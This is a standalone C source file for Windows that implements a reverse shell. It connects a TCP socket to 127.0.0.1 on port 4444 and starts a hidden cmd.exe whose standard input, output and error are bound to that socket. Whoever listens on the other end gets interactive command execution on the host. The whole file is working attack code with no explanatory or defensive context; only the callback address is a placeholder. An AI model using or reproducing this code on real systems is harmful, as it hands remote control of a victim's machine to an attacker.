#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET hSocket;
    struct sockaddr_in sockaddr_in;
    STARTUPINFO startupinfo;
    PROCESS_INFORMATION processinfo;
    HANDLE hJob;
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jobinfo = {0};

    ZeroMemory(&startupinfo, sizeof(startupinfo));

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Socket
    hSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (hSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in.sin_family = AF_INET;
    sockaddr_in.sin_port = htons(4444);
    sockaddr_in.sin_addr.s_addr = inet_addr("127.0.0.1");

    // Connect
    if (connect(hSocket, (struct sockaddr*)&sockaddr_in, sizeof(sockaddr_in)) != 0) {
        closesocket(hSocket);
        WSACleanup();
        return 1;
    }

    hJob = CreateJobObjectA(NULL, NULL);
    if (hJob == NULL) {
        closesocket(hSocket);
        WSACleanup();
        return 1;
    }

    jobinfo.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jobinfo, sizeof(jobinfo));

    // STARTUPINFO
    startupinfo.cb = sizeof(STARTUPINFO);
    startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startupinfo.wShowWindow = SW_HIDE;
    startupinfo.hStdInput = (HANDLE)hSocket;
    startupinfo.hStdOutput = (HANDLE)hSocket;
    startupinfo.hStdError = (HANDLE)hSocket;

    // Process cmd.exe
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupinfo, &processinfo)) {
        CloseHandle(hJob);
        closesocket(hSocket);
        WSACleanup();
        return 1;
    }


    AssignProcessToJobObject(hJob, processinfo.hProcess);

    WaitForSingleObject(processinfo.hProcess, INFINITE);

    CloseHandle(hJob);
    CloseHandle(processinfo.hProcess);
    CloseHandle(processinfo.hThread);
    closesocket(hSocket);
    WSACleanup();

    return 0;
}
